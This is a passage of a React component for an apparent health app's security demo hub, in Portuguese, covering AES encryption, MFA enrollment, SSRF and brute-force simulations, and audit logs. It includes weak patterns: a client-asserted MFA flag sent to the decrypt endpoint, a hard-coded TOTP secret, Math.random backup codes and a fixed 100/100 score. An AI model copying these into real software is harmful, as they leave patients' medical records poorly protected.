import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { 
  ShieldCheck, 
  ShieldAlert, 
  Lock, 
  Unlock, 
  Eye, 
  EyeOff, 
  UserCheck, 
  Key, 
  Shield, 
  AlertTriangle, 
  Terminal, 
  RefreshCw, 
  Send, 
  CheckCircle, 
  Server, 
  Globe, 
  Ban, 
  Settings, 
  Database, 
  Code, 
  Activity, 
  Users, 
  FileText, 
  Check, 
  ChevronRight, 
  AlertCircle, 
  HelpCircle, 
  ArrowLeft,
  QrCode,
  LockKeyhole,
  LockKeyholeOpen,
  Wifi,
  Radio,
  FileCheck,
  ShieldX
} from 'lucide-react';

interface SecurityHubProps {
  onNavigate: (s: any) => void;
  onMenuClick?: () => void;
  key?: string;
}

interface SecurityLog {
  id: string;
  timestamp: string;
  event: string;
  category: "AUTHENTICATION" | "ENCRYPTION" | "DATA_ACCESS" | "INPUT_VALIDATION" | "API_PROTECTION" | "AUDIT" | "RATE_LIMIT";
  severity: "INFO" | "WARNING" | "CRITICAL";
  ip: string;
  details: string;
}

export default function SecurityHub({ onNavigate }: SecurityHubProps) {
  const [activeTab, setActiveTab] = useState<'overview' | 'crypto' | 'mfa' | 'sanitize' | 'api' | 'logs'>('overview');
  const [userRole, setUserRole] = useState<'paciente' | 'medico' | 'pesquisador'>('paciente');
  
  // MFA States
  const [mfaEnabled, setMfaEnabled] = useState(false);
  const [mfaCodeInput, setMfaCodeInput] = useState('');
  const [mfaError, setMfaError] = useState('');
  const [mfaSuccess, setMfaSuccess] = useState(false);
  const [mfaBackupKey, setMfaBackupKey] = useState('');

  // Encryption States
  const [rawText, setRawText] = useState('Prontuário: Paciente relata melhora significativa na ansiedade com uso de SISA Wellness e acompanhamento quinzenal.');
  const [encryptedData, setEncryptedData] = useState<{ ciphertext: string; iv: string } | null>(null);
  const [decryptedText, setDecryptedText] = useState('');
  const [cryptoError, setCryptoError] = useState('');
  const [cryptoLoading, setCryptoLoading] = useState(false);

  // Input Validation States
  const [validationInput, setValidationInput] = useState('');
  const [sanitizationResult, setSanitizationResult] = useState<{
    original: string;
    sanitized: string;
    xssStatus: string;
    sqlStatus: string;
  } | null>(null);

  // SSRF & API Protection States
  const [targetUrl, setTargetUrl] = useState('https://saude.gov.br/v1/diretrizes');
  const [ssrfResult, setSsrfResult] = useState<any>(null);
  const [ssrfError, setSsrfError] = useState('');
  const [ssrfLoading, setSsrfLoading] = useState(false);

  // Rate Limiter Simulator States
  const [rapidRequestsCount, setRapidRequestsCount] = useState(0);
  const [isRateLimited, setIsRateLimited] = useState(false);
  const [rateLimitTimer, setRateLimitTimer] = useState(0);
  const [rateLimitError, setRateLimitError] = useState('');

  // Audit Logs States
  const [logs, setLogs] = useState<SecurityLog[]>([]);
  const [logsFilter, setLogsFilter] = useState<'ALL' | 'INFO' | 'WARNING' | 'CRITICAL'>('ALL');
  const [logsLoading, setLogsLoading] = useState(false);
  
  // Consent Management Policies
  const [policies, setPolicies] = useState({
    encryptLocalDb: true,
    shareAnonymized: true,
    auditTrail: true,
    restrictiveRbac: true
  });

  // Load audit logs from server
  const fetchLogs = async (silent = false) => {
    if (!silent) setLogsLoading(true);
    try {
      const res = await fetch('/api/security/logs');
      const data = await res.json();
      setLogs(data.logs || []);
      if (data.blockActive) {
        setIsRateLimited(true);
      }
    } catch (e) {
      console.error('Falha ao buscar logs de segurança:', e);
    } finally {
      if (!silent) setLogsLoading(false);
    }
  };

  // Helper to log custom client-side events to server audit trail
  const logSecurityEvent = async (event: string, category: string, severity: string, details: string) => {
    try {
      await fetch('/api/security/log-event', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ event, category, severity, details })
      });
      fetchLogs(true); // silent refresh
    } catch (e) {
      console.error(e);
    }
  };

  useEffect(() => {
    fetchLogs();
    // Auto refresh logs every 8 seconds if in Overview or Logs tab
    const interval = setInterval(() => {
      if (activeTab === 'overview' || activeTab === 'logs') {
        fetchLogs(true);
      }
    }, 8000);
    return () => clearInterval(interval);
  }, [activeTab]);

  // Handle Role Switching
  const handleRoleChange = (role: 'paciente' | 'medico' | 'pesquisador') => {
    setUserRole(role);
    const roleNames = { paciente: 'Paciente', medico: 'Médico', pesquisador: 'Pesquisador' };
    logSecurityEvent(
      'RBAC_ROLE_SWITCH',
      'AUTHENTICATION',
      'INFO',
      `Usuário alternou perfil simulado de acesso para: ${roleNames[role]}. Permissões atualizadas.`
    );
  };

  // Handle Encryption
  const handleEncrypt = async () => {
    if (!rawText.trim()) return;
    setCryptoLoading(true);
    setCryptoError('');
    try {
      const res = await fetch('/api/security/encrypt', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ text: rawText, userRole })
      });
      const data = await res.json();
      if (!res.ok) {
        setCryptoError(data.error || 'Erro ao criptografar');
        setEncryptedData(null);
      } else {
        setEncryptedData(data);
        setDecryptedText('');
        // Log locally
        logSecurityEvent(
          'REST_DATA_ENCRYPTED',
          'ENCRYPTION',
          'INFO',
          `Dado sensível em repouso cifrado via AES-256-CBC. Ciphertext: ${data.ciphertext.substring(0, 16)}...`
        );
      }
    } catch (err) {
      setCryptoError('Falha na comunicação com o servidor de criptografia.');
    } finally {
      setCryptoLoading(false);
    }
  };

  // Handle Decryption
  const handleDecrypt = async () => {
    if (!encryptedData) return;
    setCryptoLoading(true);
    setCryptoError('');
    try {
      const res = await fetch('/api/security/decrypt', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          ciphertext: encryptedData.ciphertext, 
          iv: encryptedData.iv, 
          userRole,
          hasMFA: mfaEnabled
        })
      });
      const data = await res.json();
      if (!res.ok) {
        setCryptoError(data.error || 'Erro ao descriptografar');
        setDecryptedText('');
      } else {
        setDecryptedText(data.plaintext);
        setCryptoError('');
        logSecurityEvent(
          'REST_DATA_DECRYPTED',
          'ENCRYPTION',
          'INFO',
          `Descriptografia AES-256 autorizada e processada com sucesso.`
        );
      }
    } catch (err) {
      setCryptoError('Falha na autenticação ou integridade da chave.');
    } finally {
      setCryptoLoading(false);
    }
  };

  // Handle MFA OTP Verification
  const handleVerifyMFA = async (e: React.FormEvent) => {
    e.preventDefault();
    setMfaError('');
    if (!/^\d{6}$/.test(mfaCodeInput)) {
      setMfaError('Código inválido. Digite 6 números.');
      return;
    }

    try {
      const res = await fetch('/api/security/mfa-verify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ code: mfaCodeInput })
      });
      const data = await res.json();
      if (data.success) {
        setMfaEnabled(true);
        setMfaSuccess(true);
        setMfaError('');
        const backupKey = 'SISA-' + Math.random().toString(36).substring(2, 10).toUpperCase() + '-' + Math.random().toString(36).substring(2, 10).toUpperCase();
        setMfaBackupKey(backupKey);
        logSecurityEvent(
          'MFA_ENROLL_SUCCESS',
          'AUTHENTICATION',
          'INFO',
          `Dispositivo MFA TOTP ativado com sucesso para o usuário.`
        );
      } else {
        setMfaError(data.error || 'Código incorreto.');
      }
    } catch (err) {
      setMfaError('Erro ao comunicar com o validador MFA.');
    }
  };

  // Disable MFA
  const handleDisableMFA = () => {
    setMfaEnabled(false);
    setMfaSuccess(false);
    setMfaCodeInput('');
    setMfaBackupKey('');
    logSecurityEvent(
      'MFA_DEACTIVATED',
      'AUTHENTICATION',
      'WARNING',
      `O usuário desativou a autenticação multifator. Nível de segurança reduzido!`
    );
  };

  // Handle Input Sanitization
  const handleSanitize = async () => {
    if (!validationInput.trim()) return;
    try {
      const res = await fetch('/api/security/sanitize', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ input: validationInput })
      });
      const data = await res.json();
      setSanitizationResult(data);
    } catch (err) {
      console.error(err);
    }
  };

  // Handle Proxy Fetch (SSRF Block Testing)
  const handleProxyFetch = async () => {
    setSsrfLoading(true);
    setSsrfError('');
    setSsrfResult(null);
    try {
      const res = await fetch('/api/security/proxy', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ url: targetUrl })
      });
      const data = await res.json();
      if (!res.ok) {
        setSsrfError(data.error || 'Acesso proxy negado');
      } else {
        setSsrfResult(data);
      }
    } catch (err) {
      setSsrfError('Falha interna de proxy de rede.');
    } finally {
      setSsrfLoading(false);
    }
  };

  // Simulate Brute Force Attack
  const handleSimulateBruteForce = async () => {
    setRateLimitError('');
    try {
      const res = await fetch('/api/security/simulate-brute-force', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' }
      });
      const data = await res.json();
      
      if (!res.ok) {
        setIsRateLimited(true);
        setRateLimitTimer(15);
        setRateLimitError(data.error || 'Muitas requisições');
        // Countdown timer in UI
        const countdown = setInterval(() => {
          setRateLimitTimer(prev => {
            if (prev <= 1) {
              clearInterval(countdown);
              setIsRateLimited(false);
              setRapidRequestsCount(0);
              setRateLimitError('');
              fetchLogs();
              return 0;
            }
            return prev - 1;
          });
        }, 1000);
      } else {
        setRapidRequestsCount(data.count || 0);
      }
    } catch (err) {
      console.error(err);
    }
  };

  // Toggle Policy Settings
  const togglePolicy = (key: keyof typeof policies) => {
    const updated = { ...policies, [key]: !policies[key] };
    setPolicies(updated);
    const policyDesc = {
      encryptLocalDb: "Criptografia de banco de dados offline",
      shareAnonymized: "Consentimento de compartilhamento estatístico",
      auditTrail: "Rastreabilidade completa de auditoria",
      restrictiveRbac: "Controle restritivo estrito de perfis"
    };
    logSecurityEvent(
      'SECURITY_POLICY_UPDATE',
      'AUDIT',
      'INFO',
      `Usuário atualizou política: [${policyDesc[key]}] para [${updated[key] ? 'ATIVADO' : 'DESATIVADO'}].`
    );
  };

  const filteredLogs = logs.filter(log => {
    if (logsFilter === 'ALL') return true;
    return log.severity === logsFilter;
  });

  return (
    <div className="pb-32 min-h-screen bg-slate-50 text-slate-800">
      {/* Top Banner with back link */}
      <header className="sticky top-0 z-50 bg-slate-900 text-white px-6 py-4 flex items-center justify-between shadow-md">
        <div className="flex items-center gap-4">
          <button 
            onClick={() => onNavigate('settings')}
            className="p-2 -ml-2 hover:bg-slate-800 rounded-full transition-colors active:scale-95 text-sky-400"
          >
            <ArrowLeft size={20} strokeWidth={2.5} />
          </button>
          <div className="text-left">
            <h1 className="text-lg font-black tracking-tight flex items-center gap-2">
              <ShieldCheck className="text-emerald-400 fill-emerald-400/10" size={22} />
              Central de Segurança
            </h1>
            <p className="text-[10px] text-slate-400 font-bold uppercase tracking-widest leading-none mt-0.5">SISA Wellness • Secure by Design</p>
          </div>
        </div>
        <div className="bg-slate-800 px-3 py-1 rounded-full border border-slate-700 flex items-center gap-1.5">
          <span className="w-2.5 h-2.5 rounded-full bg-emerald-500 animate-pulse"></span>
          <span className="text-[9px] font-bold text-slate-300 uppercase tracking-widest">LGPD Compliance</span>
        </div>
      </header>

      {/* Main content body */}
      <main className="max-w-4xl mx-auto w-full px-4 py-6 md:py-8 space-y-6">
        
        {/* Secure by Design Overview Cards & Role Simulator */}
        <section className="grid grid-cols-1 md:grid-cols-3 gap-5">
          
          {/* Security Score Box */}
          <div className="md:col-span-1 bg-white p-6 rounded-3xl border border-slate-200 shadow-sm flex flex-col justify-between text-left relative overflow-hidden">
            <div className="absolute top-0 right-0 w-24 h-24 bg-gradient-to-bl from-emerald-500/10 to-transparent rounded-full pointer-events-none"></div>
            <div>
              <span className="text-[9px] font-black uppercase tracking-wider text-slate-400 block mb-1">Status do Ecossistema</span>
              <h3 className="text-2xl font-black text-slate-900 tracking-tight leading-none mb-4">Selo de Proteção</h3>
              
              <div className="flex items-baseline gap-1 mt-2">
                <span className="text-5xl font-black text-emerald-500 font-mono">100</span>
                <span className="text-xl font-bold text-emerald-500/70">/100</span>
              </div>
              <p className="text-[10px] text-emerald-600 font-black tracking-wider uppercase bg-emerald-500/10 inline-block px-2.5 py-1 rounded-md mt-2">
                Nível de Criptografia Ativo
              </p>
            </div>

            <div className="mt-6 pt-4 border-t border-slate-100 space-y-2.5 text-xs text-slate-600 font-medium">
              <div className="flex items-center justify-between">
                <span className="opacity-70">Criptografia TLS (Trânsito):</span>
                <span className="text-emerald-600 font-bold flex items-center gap-1">
                  <Check size={14} strokeWidth={3} /> Ativo
                </span>
              </div>
              <div className="flex items-center justify-between">
                <span className="opacity-70">AES-256 (Dados em Repouso):</span>
                <span className="text-emerald-600 font-bold flex items-center gap-1">
                  <Check size={14} strokeWidth={3} /> Ativo
                </span>
              </div>
              <div className="flex items-center justify-between">
                <span className="opacity-70">Status de MFA:</span>
                <span className={`font-bold flex items-center gap-1 ${mfaEnabled ? 'text-emerald-600' : 'text-amber-600'}`}>
                  {mfaEnabled ? <><Check size={14} strokeWidth={3} /> Ativo</> : 'Inativo'}
                </span>
              </div>
            </div>
          </div>

          {/* Interactive Role Switcher */}
          <div className="md:col-span-2 bg-gradient-to-br from-slate-900 to-slate-800 text-white p-6 rounded-3xl shadow-md border border-slate-800 text-left flex flex-col justify-between">
            <div>
              <div className="flex items-center justify-between mb-4">
                <div className="flex items-center gap-2">
                  <Users className="text-sky-400" size={18} />
                  <span className="text-[10px] font-black uppercase tracking-widest text-slate-400">Simulador de Controle de Acesso (RBAC)</span>
                </div>
                <div className="bg-sky-500/10 text-sky-400 text-[8px] font-black uppercase tracking-wider px-2.5 py-1 rounded-md border border-sky-500/20">
                  Políticas de Saúde
                </div>
              </div>
              
              <h4 className="text-lg font-bold text-slate-100 mb-2">Simule Perfis de Acesso de Saúde</h4>
              <p className="text-xs text-slate-300 leading-relaxed max-w-xl mb-4">
                O SISA Wellness impõe políticas restritas de privilégio mínimo. Escolha um papel abaixo para verificar como as permissões de visibilidade e as chaves criptográficas mudam dinamicamente.
              </p>
            </div>

            <div className="grid grid-cols-3 gap-3">
              {[
                { id: 'paciente', label: 'Paciente', desc: 'Acesso a dados pessoais próprios' },
                { id: 'medico', label: 'Médico SISA', desc: 'Edita prontuário (requer MFA)' },
                { id: 'pesquisador', label: 'Pesquisador', desc: 'Dados consolidados e anônimos' }
              ].map((role) => (
                <button
                  key={role.id}
                  onClick={() => handleRoleChange(role.id as any)}
                  className={`p-3 rounded-2xl border text-left transition-all duration-300 relative overflow-hidden ${userRole === role.id ? 'bg-sky-500 border-sky-400 shadow-lg text-white' : 'bg-slate-800/50 border-slate-700/60 text-slate-300 hover:bg-slate-800'}`}
                >
                  <span className="font-black text-xs block mb-0.5">{role.label}</span>
                  <span className={`text-[8px] leading-tight block ${userRole === role.id ? 'text-white/80' : 'text-slate-400'}`}>
                    {role.desc}
                  </span>
                  {userRole === role.id && (
                    <div className="absolute bottom-1 right-2 w-1.5 h-1.5 rounded-full bg-white"></div>
                  )}
                </button>
              ))}
            </div>
          </div>

        </section>

        {/* Tab Selection */}
        <section className="flex gap-1 overflow-x-auto bg-slate-200/60 p-1.5 rounded-2xl border border-slate-300/40">
          {[
            { id: 'overview', label: 'Início', icon: Shield },
            { id: 'crypto', label: 'Criptografia (AES)', icon: Lock },
            { id: 'mfa', label: 'Duas Etapas (MFA)', icon: Key },
            { id: 'sanitize', label: 'Injeções & XSS', icon: Code },
            { id: 'api', label: 'APIs & SSRF', icon: Globe },
            { id: 'logs', label: 'Logs Auditoria', icon: Terminal }
          ].map((tab) => (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id as any)}
              className={`flex items-center gap-1.5 px-3 py-2.5 rounded-xl text-xs font-black uppercase tracking-wider transition-all duration-200 whitespace-nowrap ${activeTab === tab.id ? 'bg-white text-slate-900 shadow-sm' : 'text-slate-500 hover:text-slate-800'}`}
            >
              <tab.icon size={14} className={activeTab === tab.id ? 'text-sky-500' : ''} />
              {tab.label}
            </button>
          ))}
        </section>

        {/* Dynamic Tab Panes */}
        <div className="bg-white rounded-3xl border border-slate-200 shadow-sm overflow-hidden min-h-[400px]">
          <AnimatePresence mode="wait">
            
            {/* OVERVIEW TAB */}
            {activeTab === 'overview' && (
              <motion.div 
                key="tab-overview"
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -10 }}
                className="p-6 text-left space-y-6"
              >
                <div>
                  <h3 className="text-xl font-black text-slate-900 tracking-tight">O que significa Secure by Design na SISA?</h3>
                  <p className="text-xs text-slate-600 mt-1 max-w-3xl">
                    Sistemas médicos lidam com dados altamente confidenciais. Aplicar Secure by Design significa que a segurança não é um remendo inserido de última hora, mas sim a base estrutural de toda a arquitetura de banco de dados, comunicações e rotas.
                  </p>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  {[
                    { title: 'Criptografia em Repouso e Trânsito', desc: 'Prontuários e receitas são cifrados localmente e em nuvem via AES-256 de grau militar. Todo o tráfego é encapsulado em HTTPS com TLS 1.3 obrigatório.', icon: Lock },
                    { title: 'Autenticação Multifator (MFA)', desc: 'Prevenção contra furto de credenciais médicas. O acesso a históricos clínicos de pacientes exige validação dinâmica TOTP via app autenticador.', icon: Key },
                    { title: 'Defesa contra Injeções & XSS', desc: 'Todo campo de entrada de dados do SISA passa por sanitização rigorosa para impedir injeções SQL e Cross-Site Scripting (XSS).', icon: Code },
                    { title: 'Monitoramento & Auditoria Ativos', desc: 'Geração de logs centralizados e imutáveis para conformidade com a LGPD. Detecção instantânea de acessos anômalos e rate limiting robusto.', icon: Terminal },
                  ].map((feat, idx) => (
                    <div key={idx} className="p-5 bg-slate-50 rounded-2xl border border-slate-100 flex items-start gap-4">
                      <div className="w-10 h-10 rounded-xl bg-sky-500/10 flex items-center justify-center text-sky-600 flex-none mt-1">
                        <feat.icon size={20} />
                      </div>
                      <div>
                        <h4 className="font-bold text-sm text-slate-900">{feat.title}</h4>
                        <p className="text-[11px] text-slate-500 leading-relaxed mt-1">{feat.desc}</p>
                      </div>
                    </div>
                  ))}
                </div>

                <div className="pt-4 border-t border-slate-100 space-y-4">
                  <h4 className="font-black text-xs uppercase tracking-wider text-slate-400">Políticas de Privacidade Ativas (LGPD)</h4>
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                    {[
                      { key: 'encryptLocalDb', title: 'Criptografar Prontuários no Dispositivo (AES-256)', desc: 'Adiciona camada extra offline no celular do paciente.' },
                      { key: 'shareAnonymized', title: 'Permitir Compartilhamento Anônimo para Pesquisa', desc: 'Seus dados epidemiológicos agregados ajudam a ciência, sem revelar sua identidade.' },
                      { key: 'auditTrail', title: 'Habilitar Rastreabilidade Total de Auditoria', desc: 'Registra e notifica acessos legítimos de médicos e laboratórios.' },
                      { key: 'restrictiveRbac', title: 'Impor Controle Restrito por Perfis (RBAC)', desc: 'Bloqueio estrito de leitura para perfis não autorizados.' }
                    ].map((pol) => (
                      <div key={pol.key} className="flex items-center justify-between p-4 bg-slate-50 rounded-2xl border border-slate-100">
                        <div className="flex-1 pr-4">
                          <p className="font-bold text-xs text-slate-800 leading-tight mb-0.5">{pol.title}</p>
                          <p className="text-[9px] text-slate-500 leading-tight">{pol.desc}</p>
                        </div>
                        <button 
                          onClick={() => togglePolicy(pol.key as any)}
                          className={`w-10 h-5.5 rounded-full relative transition-all duration-300 flex-none ${policies[pol.key as keyof typeof policies] ? 'bg-sky-500' : 'bg-slate-300'}`}
                        >
                          <div className={`absolute top-0.5 w-4.5 h-4.5 bg-white rounded-full shadow-sm transition-all duration-300 ${policies[pol.key as keyof typeof policies] ? 'left-5' : 'left-0.5'}`}></div>
                        </button>
                      </div>
                    ))}
                  </div>
                </div>
              </motion.div>
            )}

            {/* CRYPTO TAB */}
            {activeTab === 'crypto' && (
              <motion.div 
                key="tab-crypto"
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -10 }}
                className="p-6 text-left space-y-6"
              >
                <div>
                  <div className="flex items-center gap-2">
                    <LockKeyhole className="text-emerald-500" size={20} />
                    <h3 className="text-lg font-black text-slate-900 tracking-tight">Criptografia de Dados de Saúde</h3>
                  </div>
                  <p className="text-xs text-slate-500 mt-1">
                    Esta demonstração simula como dados sensíveis inseridos no aplicativo são criptografados no servidor usando a especificação AES-256-CBC com Salt dinâmico e IV aleatório antes de serem armazenados no banco de dados.
                  </p>
                </div>

                <div className="space-y-4">
                  {/* Text Input area */}
                  <div>
                    <label className="text-[10px] font-black uppercase tracking-wider text-slate-400 block mb-1">Conteúdo Médico Confidencial (Plaintext)</label>
                    <textarea 
                      value={rawText}
                      onChange={(e) => setRawText(e.target.value)}
                      rows={3}
                      className="w-full bg-slate-50 border border-slate-200 rounded-2xl p-4 text-xs font-medium focus:ring-2 focus:ring-sky-500/20 text-slate-800"
                    />
                  </div>

                  {/* Actions Row */}
                  <div className="flex flex-wrap gap-3">
                    <button
                      onClick={handleEncrypt}
                      disabled={cryptoLoading}
                      className="px-5 py-3 bg-slate-900 text-white rounded-2xl text-xs font-bold hover:bg-slate-800 transition-all flex items-center gap-2 shadow-sm disabled:opacity-50"
                    >
                      {cryptoLoading ? <RefreshCw className="animate-spin" size={14} /> : <Lock size={14} />}
                      Criptografar Dado (AES-256)
                    </button>

                    <button
                      onClick={handleDecrypt}
                      disabled={cryptoLoading || !encryptedData}
                      className="px-5 py-3 bg-sky-500 text-white rounded-2xl text-xs font-bold hover:bg-sky-400 transition-all flex items-center gap-2 shadow-sm disabled:opacity-50"
                    >
                      {cryptoLoading ? <RefreshCw className="animate-spin" size={14} /> : <Unlock size={14} />}
                      Descriptografar com Segurança
                    </button>
                  </div>

                  {/* Visual representation of DB storage vs Client visualization */}
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4 pt-2">
                    
                    {/* Database View (Ciphertext) */}
                    <div className="bg-slate-900 text-slate-300 p-5 rounded-2xl border border-slate-800 font-mono text-left relative overflow-hidden flex flex-col justify-between min-h-[160px]">
                      <div className="absolute top-3 right-3 text-[9px] font-black text-slate-500 tracking-wider uppercase border border-slate-800 px-2 py-0.5 rounded">
                        REPRESENTAÇÃO DB
                      </div>
                      <div>
                        <span className="text-[9px] font-black text-slate-500 uppercase tracking-widest block mb-1.5">Armazenado em Repouso (Banco de Dados)</span>
                        {encryptedData ? (
                          <div className="space-y-2 text-[11px] leading-tight text-slate-400 select-all break-all">
                            <p><span className="text-emerald-400 font-bold">"ciphertext"</span>: "{encryptedData.ciphertext}"</p>
                            <p><span className="text-sky-400 font-bold">"iv"</span>: "{encryptedData.iv}"</p>
                            <p><span className="text-amber-400 font-bold">"algorithm"</span>: "aes-256-cbc"</p>
                          </div>
                        ) : (
                          <p className="text-[11px] text-slate-600 italic">Nenhum dado criptografado no momento. Digite acima e clique em Criptografar.</p>
                        )}
                      </div>
                      
                      <div className="mt-4 pt-3 border-t border-slate-800 flex items-center gap-2 text-[10px] text-slate-500 font-bold leading-none">
                        <Database size={12} />
                        Segurança Física do Servidor Ativada
                      </div>
                    </div>

                    {/* Client Presentation (Decrypted text or Access Denied) */}
                    <div className="bg-slate-50 p-5 rounded-2xl border border-slate-200 text-left flex flex-col justify-between min-h-[160px]">
                      <div>
                        <span className="text-[9px] font-black text-slate-400 uppercase tracking-widest block mb-1.5">Visualização Autorizada do Usuário</span>
                        
                        {cryptoError ? (
                          <div className="p-3 bg-red-50 border border-red-200 rounded-xl flex items-start gap-2 text-red-700">
                            <ShieldX className="text-red-500 mt-0.5 flex-none" size={16} />
                            <div>
                              <p className="font-bold text-xs leading-none">Acesso Negado (HTTP 403)</p>
                              <p className="text-[10px] leading-snug font-medium mt-1">{cryptoError}</p>
                            </div>
                          </div>
                        ) : decryptedText ? (
                          <div className="p-3 bg-emerald-500/5 border border-emerald-500/20 rounded-xl text-emerald-800 font-medium text-xs leading-relaxed">
                            <p className="text-[9px] text-emerald-600 font-bold mb-1">✓ Descriptografado com sucesso</p>
                            "{decryptedText}"
                          </div>
                        ) : (
                          <p className="text-xs text-slate-500 italic mt-4">Aguardando gatilho de descriptografia autorizada.</p>
                        )}
                      </div>

                      <div className="mt-4 pt-3 border-t border-slate-200/60 flex items-center justify-between text-[10px] font-bold">
                        <span className="text-slate-400 uppercase tracking-widest flex items-center gap-1.5 leading-none">
                          <Eye size={12} /> Perfil Ativo: {userRole === 'paciente' ? 'Paciente' : userRole === 'medico' ? 'Médico' : 'Pesquisador'}
                        </span>
                        {userRole === 'medico' && (
                          <span className={`inline-block px-1.5 py-0.5 rounded text-[8px] uppercase tracking-wider ${mfaEnabled ? 'bg-emerald-100 text-emerald-800' : 'bg-amber-100 text-amber-800'}`}>
                            MFA {mfaEnabled ? 'ATIVO' : 'REQUERIDO'}
                          </span>
                        )}
                      </div>
                    </div>

                  </div>
                </div>
              </motion.div>
            )}

            {/* MFA TAB */}
            {activeTab === 'mfa' && (
              <motion.div 
                key="tab-mfa"
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -10 }}
                className="p-6 text-left space-y-6"
              >
                <div>
                  <div className="flex items-center gap-2">
                    <Key className="text-sky-500" size={20} />
                    <h3 className="text-lg font-black text-slate-900 tracking-tight">Autenticação Multifator (MFA TOTP)</h3>
                  </div>
                  <p className="text-xs text-slate-500 mt-1">
                    Proteja sua conta contra clonagem de senha. Com o MFA ativo, mesmo que um hacker descubra sua credencial, ele não conseguirá acessar o prontuário sem o código numérico dinâmico gerado no celular físico do profissional de saúde.
                  </p>
                </div>

                {!mfaEnabled ? (
                  <div className="grid grid-cols-1 md:grid-cols-5 gap-6 p-5 bg-slate-50 rounded-2xl border border-slate-200">
                    
                    {/* Visual QR Code simulation */}
                    <div className="md:col-span-2 flex flex-col items-center justify-center p-4 bg-white border border-slate-200 rounded-2xl shadow-sm text-center">
                      <div className="w-32 h-32 bg-slate-100 rounded-xl border border-slate-200 flex items-center justify-center p-2 mb-2 relative">
                        <QrCode className="text-slate-800 w-full h-full" strokeWidth={1.5} />
                        <div className="absolute inset-0 bg-slate-900/5 flex items-center justify-center backdrop-blur-[0.5px]">
                          <span className="bg-slate-900 text-white font-mono text-[8px] font-black uppercase tracking-widest px-2 py-0.5 rounded leading-none">Chave Segura SISA</span>
                        </div>
                      </div>
                      <p className="text-[10px] font-bold text-slate-500 select-all font-mono bg-slate-100 px-3 py-1 rounded">
                        secret_sisa_totp_2026_jwt
                      </p>
                    </div>

                    {/* Code input validation */}
                    <div className="md:col-span-3 flex flex-col justify-between space-y-4">
                      <div>
                        <span className="text-[9px] font-black text-slate-400 uppercase tracking-widest block mb-1.5">Passo a Passo de Configuração</span>
                        <ol className="text-xs text-slate-600 space-y-2 list-decimal list-inside font-medium leading-relaxed">
                          <li>Abra o aplicativo <strong>Google Authenticator</strong> ou similar no seu smartphone.</li>
                          <li>Escaneie o código QR ao lado ou insira manualmente a chave secreta.</li>
                          <li>Insira o código de 6 dígitos gerado pelo aplicativo abaixo para confirmar o pareamento.</li>
                        </ol>
                      </div>

                      <form onSubmit={handleVerifyMFA} className="space-y-3">
                        <div>
                          <label className="text-[10px] font-black uppercase tracking-wider text-slate-400 block mb-1">Código de Confirmação (6 dígitos)</label>
                          <div className="flex gap-2">
                            <input 
                              type="text"
                              maxLength={6}
                              placeholder="000 000"
                              value={mfaCodeInput}
                              onChange={(e) => setMfaCodeInput(e.target.value.replace(/\D/g, ''))}
                              className="bg-white border border-slate-200 rounded-xl px-4 py-2 text-sm font-black tracking-widest focus:ring-2 focus:ring-sky-500/20 text-slate-800 w-36 text-center"
                            />
                            <button
                              type="submit"
                              className="px-5 py-2.5 bg-slate-900 text-white rounded-xl text-xs font-bold hover:bg-slate-800 transition-all flex items-center gap-1.5"
                            >
                              <CheckCircle size={14} /> Ativar MFA
                            </button>
                          </div>
                        </div>

                        {mfaError && (
                          <p className="text-red-500 text-xs font-bold flex items-center gap-1 mt-1">
                            <AlertCircle size={12} /> {mfaError}
                          </p>
                        )}
                      </form>
                    </div>

                  </div>
                ) : (
                  <div className="p-6 bg-emerald-500/5 border border-emerald-500/20 rounded-2xl flex flex-col md:flex-row items-center gap-6 justify-between text-left">
                    <div className="flex items-center gap-4">
                      <div className="w-14 h-14 rounded-2xl bg-emerald-500/10 flex items-center justify-center text-emerald-500 flex-none">
                        <ShieldCheck size={36} strokeWidth={2.5} />
                      </div>
                      <div className="space-y-1">
                        <h4 className="text-base font-black text-slate-900">Sua Autenticação Multifator está ATIVA!</h4>
                        <p className="text-xs text-slate-500 leading-normal max-w-lg">
                          O SISA Wellness agora exige o código do autenticador sempre que seu perfil for usado para realizar ações de alta criticidade (como a descriptografia de prontuários por médicos).
                        </p>
                      </div>
                    </div>

                    <div className="flex-none">
                      <button
                        onClick={handleDisableMFA}
                        className="px-4 py-2.5 bg-red-100 hover:bg-red-200 text-red-700 rounded-xl text-xs font-bold transition-all"
                      >
                        Desativar MFA
                      </button>
                    </div>
                  </div>
                )}

                {/* Backup Keys Container */}
                {mfaEnabled && mfaBackupKey && (
                  <div className="p-4 bg-slate-50 border border-slate-200 rounded-2xl space-y-2">
                    <span className="text-[9px] font-black text-slate-400 uppercase tracking-widest block">Código de Backup de Segurança</span>
                    <p className="text-xs text-slate-500 font-medium">Salve este código em um local seguro. Caso perca o celular do autenticador, use este código para restaurar seu acesso:</p>
                    <div className="bg-white border border-slate-200 rounded-xl p-3 text-slate-800 font-mono text-xs font-black select-all text-center tracking-wider">
                      {mfaBackupKey}
                    </div>
                  </div>
                )}
              </motion.div>
            )}

            {/* SANITIZE TAB */}
            {activeTab === 'sanitize' && (
              <motion.div 
                key="tab-sanitize"
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -10 }}
                className="p-6 text-left space-y-6"
              >
                <div>
                  <div className="flex items-center gap-2">
                    <Code className="text-sky-500" size={20} />
